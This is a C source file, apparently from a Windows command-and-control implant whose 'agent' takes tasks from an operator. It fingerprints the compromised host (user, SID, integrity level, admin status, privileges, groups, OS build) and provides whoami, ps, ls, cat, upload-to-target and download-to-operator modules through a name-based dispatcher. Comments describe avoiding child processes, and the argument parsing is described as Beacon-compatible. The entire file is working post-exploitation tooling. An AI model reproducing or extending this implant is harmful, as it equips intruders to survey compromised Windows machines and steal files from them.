/*
 * modules.c — System info collection and native module implementations.
 * All operations use Win32 API directly — no child processes spawned.
 *
 * Modules: whoami, ps, ls, cat, upload, download
 */
#include "agent.h"

/* ─── Argument parsing helpers (BeaconDataParse-compatible) ─── */

typedef struct {
    const unsigned char *data;
    DWORD offset;
    DWORD length;
} ArgParser;

static void arg_parse_init(ArgParser *p, const unsigned char *data, DWORD len) {
    p->data = data;
    p->offset = 0;
    p->length = len;
}

static const char *arg_extract_str(ArgParser *p) {
    if (p->offset + 4 > p->length) return "";
    DWORD slen;
    memcpy(&slen, p->data + p->offset, 4);
    p->offset += 4;
    if (p->offset + slen > p->length) return "";
    const char *str = (const char *)(p->data + p->offset);
    p->offset += slen;
    return str;
}

static int arg_extract_int(ArgParser *p) {
    if (p->offset + 4 > p->length) return 0;
    int val;
    memcpy(&val, p->data + p->offset, 4);
    p->offset += 4;
    return val;
}

static const unsigned char *arg_extract_bin(ArgParser *p, DWORD *out_len) {
    if (p->offset + 4 > p->length) { *out_len = 0; return NULL; }
    DWORD blen;
    memcpy(&blen, p->data + p->offset, 4);
    p->offset += 4;
    if (p->offset + blen > p->length) { *out_len = 0; return NULL; }
    const unsigned char *ptr = p->data + p->offset;
    p->offset += blen;
    *out_len = blen;
    return ptr;
}

/* ─── System info collection ─── */

void sysinfo_collect(Buffer *tlv_out) {
    char buf[512];

    /* Hostname */
    DWORD size = sizeof(buf);
    if (GetComputerNameA(buf, &size))
        tlv_add_string(tlv_out, TLV_HOSTNAME, buf);

    /* Username (DOMAIN\user) */
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        DWORD token_len;
        GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
        unsigned char *token_buf = (unsigned char *)malloc(token_len);
        if (GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len)) {
            TOKEN_USER *tu = (TOKEN_USER *)token_buf;
            char name[128] = {0}, domain[128] = {0};
            DWORD name_len = sizeof(name), domain_len = sizeof(domain);
            SID_NAME_USE snu;
            if (LookupAccountSidA(NULL, tu->User.Sid, name, &name_len,
                                  domain, &domain_len, &snu)) {
                snprintf(buf, sizeof(buf), "%s\\%s", domain, name);
                tlv_add_string(tlv_out, TLV_USERNAME, buf);
            }
        }
        free(token_buf);

        /* Integrity level */
        GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
        token_buf = (unsigned char *)malloc(token_len);
        if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
            TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
            DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                         *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
            BYTE level = INTEGRITY_MEDIUM;
            if (*sub >= 0x4000) level = INTEGRITY_SYSTEM;
            else if (*sub >= 0x3000) level = INTEGRITY_HIGH;
            else if (*sub >= 0x2000) level = INTEGRITY_MEDIUM;
            else level = INTEGRITY_LOW;
            tlv_add_uint8(tlv_out, TLV_INTEGRITY, level);

            /* Is admin? */
            BOOL is_admin = FALSE;
            SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
            PSID adminSid;
            if (AllocateAndInitializeSid(&ntAuth, 2,
                    SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
                    0, 0, 0, 0, 0, 0, &adminSid)) {
                CheckTokenMembership(NULL, adminSid, &is_admin);
                FreeSid(adminSid);
            }
            tlv_add_uint8(tlv_out, TLV_IS_ADMIN, is_admin ? 1 : 0);
        }
        free(token_buf);
        CloseHandle(hToken);
    }

    /* PID */
    tlv_add_uint32(tlv_out, TLV_PID, GetCurrentProcessId());

    /* Architecture */
#ifdef _WIN64
    tlv_add_uint8(tlv_out, TLV_ARCH, ARCH_X64);
#else
    BOOL isWow64 = FALSE;
    IsWow64Process(GetCurrentProcess(), &isWow64);
    tlv_add_uint8(tlv_out, TLV_ARCH, isWow64 ? ARCH_X64 : ARCH_X86);
#endif

    /* OS version from registry */
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
            0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char product[256] = {0}, build[64] = {0};
        DWORD psize = sizeof(product), bsize = sizeof(build);
        RegQueryValueExA(hKey, "ProductName", NULL, NULL, (LPBYTE)product, &psize);
        RegQueryValueExA(hKey, "CurrentBuildNumber", NULL, NULL, (LPBYTE)build, &bsize);
        snprintf(buf, sizeof(buf), "%s Build %s", product, build);
        tlv_add_string(tlv_out, TLV_OS_VERSION, buf);
        RegCloseKey(hKey);
    }

    /* Process name */
    char proc_name[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, proc_name, MAX_PATH);
    char *slash = strrchr(proc_name, '\\');
    tlv_add_string(tlv_out, TLV_PROCESS_NAME, slash ? slash + 1 : proc_name);

    /* Runtime (C agent, no .NET) */
    tlv_add_string(tlv_out, TLV_DOTNET_VERSION, "native-c");
    tlv_add_string(tlv_out, TLV_AGENT_VERSION, CONFIG_AGENT_VER);

    /* CWD */
    char cwd[MAX_PATH] = {0};
    GetCurrentDirectoryA(MAX_PATH, cwd);
    tlv_add_string(tlv_out, TLV_CWD, cwd);
}

/* ─── Module: whoami ─── */

void mod_whoami(Buffer *out) {
    char line[512];
    HANDLE hToken;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        buf_append(out, "Failed to open process token\n", 29);
        return;
    }

    /* Username */
    DWORD token_len;
    GetTokenInformation(hToken, TokenUser, NULL, 0, &token_len);
    unsigned char *token_buf = (unsigned char *)malloc(token_len);
    GetTokenInformation(hToken, TokenUser, token_buf, token_len, &token_len);
    TOKEN_USER *tu = (TOKEN_USER *)token_buf;

    char name[128], domain[128];
    DWORD name_len = sizeof(name), domain_len = sizeof(domain);
    SID_NAME_USE snu;
    LookupAccountSidA(NULL, tu->User.Sid, name, &name_len, domain, &domain_len, &snu);

    char *sid_str = NULL;
    ConvertSidToStringSidA(tu->User.Sid, &sid_str);

    snprintf(line, sizeof(line), "Username:  %s\\%s\nSID:       %s\n", domain, name, sid_str ? sid_str : "?");
    buf_append(out, line, (DWORD)strlen(line));
    if (sid_str) LocalFree(sid_str);
    free(token_buf);

    /* Integrity */
    GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &token_len);
    token_buf = (unsigned char *)malloc(token_len);
    if (GetTokenInformation(hToken, TokenIntegrityLevel, token_buf, token_len, &token_len)) {
        TOKEN_MANDATORY_LABEL *tml = (TOKEN_MANDATORY_LABEL *)token_buf;
        DWORD *sub = GetSidSubAuthority(tml->Label.Sid,
                     *GetSidSubAuthorityCount(tml->Label.Sid) - 1);
        const char *level = "Medium";
        if (*sub >= 0x4000) level = "System";
        else if (*sub >= 0x3000) level = "High";
        else if (*sub < 0x2000) level = "Low";
        snprintf(line, sizeof(line), "Integrity: %s\n", level);
        buf_append(out, line, (DWORD)strlen(line));
    }
    free(token_buf);

    /* Privileges */
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &token_len);
    token_buf = (unsigned char *)malloc(token_len);
    if (GetTokenInformation(hToken, TokenPrivileges, token_buf, token_len, &token_len)) {
        TOKEN_PRIVILEGES *tp = (TOKEN_PRIVILEGES *)token_buf;
        buf_append(out, "\n=== PRIVILEGES ===\n", 19);
        for (DWORD i = 0; i < tp->PrivilegeCount; i++) {
            char priv_name[128] = {0};
            DWORD pn_len = sizeof(priv_name);
            LookupPrivilegeNameA(NULL, &tp->Privileges[i].Luid, priv_name, &pn_len);
            const char *status = (tp->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
                                 ? "ENABLED" : "DISABLED";
            snprintf(line, sizeof(line), "  %-45s %s\n", priv_name, status);
            buf_append(out, line, (DWORD)strlen(line));
        }
    }
    free(token_buf);

    /* Groups */
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &token_len);
    token_buf = (unsigned char *)malloc(token_len);
    if (GetTokenInformation(hToken, TokenGroups, token_buf, token_len, &token_len)) {
        TOKEN_GROUPS *tg = (TOKEN_GROUPS *)token_buf;
        buf_append(out, "\n=== GROUP MEMBERSHIP ===\n", 25);
        for (DWORD i = 0; i < tg->GroupCount; i++) {
            char gname[128] = {0}, gdomain[128] = {0};
            DWORD gn_len = sizeof(gname), gd_len = sizeof(gdomain);
            SID_NAME_USE gsnu;
            if (LookupAccountSidA(NULL, tg->Groups[i].Sid, gname, &gn_len,
                                  gdomain, &gd_len, &gsnu)) {
                snprintf(line, sizeof(line), "  %s\\%s\n", gdomain, gname);
                buf_append(out, line, (DWORD)strlen(line));
            }
        }
    }
    free(token_buf);
    CloseHandle(hToken);
}

/* ─── Module: ps (process list) ─── */

void mod_ps(Buffer *out) {
    char line[512];
    snprintf(line, sizeof(line), "%-6s %-6s %-6s %s\n", "PID", "PPID", "SID", "NAME");
    buf_append(out, line, (DWORD)strlen(line));
    buf_append(out, "────── ────── ────── ────────────────────\n", 42);

    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);

    if (Process32First(hSnap, &pe)) {
        do {
            snprintf(line, sizeof(line), "%-6lu %-6lu %-6lu %s\n",
                     pe.th32ProcessID, pe.th32ParentProcessID,
                     0UL, /* session ID not in PROCESSENTRY32 */
                     pe.szExeFile);
            buf_append(out, line, (DWORD)strlen(line));
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
}

/* ─── Module: ls (directory listing) ─── */

void mod_ls(Buffer *out, const char *path) {
    char search[MAX_PATH];
    char line[1024];

    if (!path || strlen(path) == 0)
        GetCurrentDirectoryA(MAX_PATH, search);
    else
        strncpy(search, path, MAX_PATH - 3);

    /* Append \* for FindFirstFile */
    size_t slen = strlen(search);
    if (search[slen - 1] != '\\') strcat(search, "\\");
    strcat(search, "*");

    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search, &fd);
    if (hFind == INVALID_HANDLE_VALUE) {
        snprintf(line, sizeof(line), "Error listing: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, line, (DWORD)strlen(line));
        return;
    }

    snprintf(line, sizeof(line), "%-5s %-20s %-12s %s\n", "TYPE", "MODIFIED", "SIZE", "NAME");
    buf_append(out, line, (DWORD)strlen(line));
    buf_append(out, "───── ──────────────────── ──────────── ────────────────────\n", 60);

    do {
        const char *type = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) ? "DIR" : "FILE";

        SYSTEMTIME st;
        FileTimeToSystemTime(&fd.ftLastWriteTime, &st);
        char timestr[32];
        snprintf(timestr, sizeof(timestr), "%04d-%02d-%02d %02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute);

        ULONGLONG fsize = ((ULONGLONG)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;

        snprintf(line, sizeof(line), "%-5s %-20s %-12llu %s\n",
                 type, timestr, fsize, fd.cFileName);
        buf_append(out, line, (DWORD)strlen(line));
    } while (FindNextFileA(hFind, &fd));

    FindClose(hFind);
}

/* ─── Module: cat (read file) ─── */

void mod_cat(Buffer *out, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "Cannot open: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize > 10 * 1024 * 1024) { /* 10MB limit */
        buf_append(out, "File too large (>10MB)\n", 22);
        CloseHandle(hFile);
        return;
    }

    unsigned char *fbuf = (unsigned char *)malloc(fsize);
    DWORD bytes_read;
    if (ReadFile(hFile, fbuf, fsize, &bytes_read, NULL)) {
        buf_append(out, fbuf, bytes_read);
    }
    free(fbuf);
    CloseHandle(hFile);
}

/* ─── Module: upload (write file to target) ─── */

void mod_upload(Buffer *out, const char *path,
                const unsigned char *data, DWORD data_len) {
    HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        char err[256];
        snprintf(err, sizeof(err), "Cannot create: %s (err=%lu)\n", path, GetLastError());
        buf_append(out, err, (DWORD)strlen(err));
        return;
    }

    DWORD written;
    if (WriteFile(hFile, data, data_len, &written, NULL)) {
        char msg[256];
        snprintf(msg, sizeof(msg), "Written %lu bytes to %s\n", written, path);
        buf_append(out, msg, (DWORD)strlen(msg));
    }
    CloseHandle(hFile);
}

/* ─── Module: download (read file for transfer to operator) ─── */

void mod_download(Buffer *out, const char *path) {
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return; /* Error signaled via result status */
    }

    DWORD fsize = GetFileSize(hFile, NULL);
    if (fsize > 50 * 1024 * 1024) { /* 50MB limit */
        CloseHandle(hFile);
        return;
    }

    unsigned char *fbuf = (unsigned char *)malloc(fsize);
    DWORD bytes_read;
    if (ReadFile(hFile, fbuf, fsize, &bytes_read, NULL)) {
        buf_append(out, fbuf, bytes_read);
    }
    free(fbuf);
    CloseHandle(hFile);
}

/* ─── Module dispatch ─── */

BOOL module_execute(const char *name, const unsigned char *args, DWORD args_len,
                    unsigned char **result, DWORD *result_len) {
    Buffer out;
    buf_init(&out, 4096);

    ArgParser ap;
    arg_parse_init(&ap, args, args_len);

    if (strcmp(name, "whoami") == 0) {
        mod_whoami(&out);
    }
    else if (strcmp(name, "ps") == 0) {
        mod_ps(&out);
    }
    else if (strcmp(name, "ls") == 0) {
        const char *path = arg_extract_str(&ap);
        mod_ls(&out, path);
    }
    else if (strcmp(name, "cat") == 0) {
        const char *path = arg_extract_str(&ap);
        mod_cat(&out, path);
    }
    else if (strcmp(name, "upload") == 0) {
        const char *path = arg_extract_str(&ap);
        DWORD data_len;
        const unsigned char *data = arg_extract_bin(&ap, &data_len);
        mod_upload(&out, path, data, data_len);
    }
    else if (strcmp(name, "download") == 0) {
        const char *path = arg_extract_str(&ap);
        mod_download(&out, path);
    }
    else {
        char err[256];
        snprintf(err, sizeof(err), "Unknown module: %s\n", name);
        buf_append(&out, err, (DWORD)strlen(err));
        *result = out.data;
        *result_len = out.len;
        return FALSE;
    }

    *result = out.data;
    *result_len = out.len;
    return TRUE;
}
